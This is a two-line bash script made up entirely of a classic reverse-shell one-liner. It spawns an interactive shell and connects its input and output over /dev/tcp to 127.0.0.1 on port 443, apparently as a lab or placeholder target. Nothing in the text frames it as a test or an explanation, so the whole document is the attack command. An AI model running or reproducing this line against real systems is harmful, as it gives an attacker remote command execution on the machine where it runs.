#!/bin/bash
sh -i >& /dev/tcp/127.0.0.1/443 0>&1
